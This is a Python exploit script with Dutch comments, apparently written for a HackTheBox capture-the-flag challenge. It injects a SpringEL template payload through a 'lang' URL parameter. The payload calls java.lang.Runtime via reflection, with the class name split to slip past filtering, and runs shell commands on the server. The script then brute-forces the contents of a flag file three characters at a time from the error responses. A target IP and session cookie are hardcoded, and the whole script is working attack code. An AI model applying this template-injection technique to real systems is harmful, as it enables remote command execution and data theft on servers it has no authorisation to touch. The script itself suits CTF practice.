import requests
import urllib.parse

# Basis URL van de CTF-applicatie
url = "http://94.237.62.166:59404/?lang="
# Cookie voor de sessie
cookies = {
    'JSESSIONID': '92A172DAF3F457385CD5D9AC62916D60'
}

# Bestandsnaam en format van de flag
file_to_read = "/flag_[a-zA-Z0-9].txt"
flag_format = "HTB{xxxxxxxxxxxxxx}"

# Beperkt de karakters tot kleine letters, cijfers en underscore
character_set = "abcdefghijklmnopqrstuvwxyz0123456789_"

def find_flag(file, flag_format):
    result = ""
    session = requests.Session()
    
    while True:
        char_found = False
        for char1 in character_set:
            for char2 in character_set:
                for char3 in character_set:
                    trio = char1 + char2 + char3
                    command = f"ls / | grep 'flag_' | xargs -I \\{{\\}} grep {result + trio} /\\{{\\}}"
                    raw_payload = f"${{''.getClass().forName('ja'+'va.lang.Runtime').getRuntime().exec('{command}').getInputStream().read()}}::"
                    encoded_payload = urllib.parse.quote(raw_payload, safe='')

                    response = session.get(url + encoded_payload, cookies=cookies)
                    print(response.text)
                    print(f"raw_payload: {raw_payload}")

                    # Controleer de response om te zien of het trio correct is
                    if "Error resolving template [" in response.text:
                        error_message = response.text.strip()
                        start_idx = error_message.find("[") + 1
                        end_idx = error_message.find("]")
                        if start_idx != -1 and end_idx != -1:
                            error_number = error_message[start_idx:end_idx]
                            if error_number.isdigit() and int(error_number) > 0:
                                result += trio
                                print(f"Confirmed trio: {trio} -> Current result: {result}")
                                char_found = True
                                break
                    elif response.text.strip() != "-1" and "Exception evaluating SpringEL expression" not in response.text:
                        result += trio
                        print(f"Found trio: {trio} -> Current result: {result}")
                        char_found = True
                        break

                if char_found:
                    break

            if char_found:
                break

        if not char_found:
            print("No further matches found; stopping.")
            break

    return result

# Voer de zoekopdracht uit voor de vlag
flag_content = find_flag(file_to_read, flag_format)
print(f"\nContent of flag file: {flag_content}")
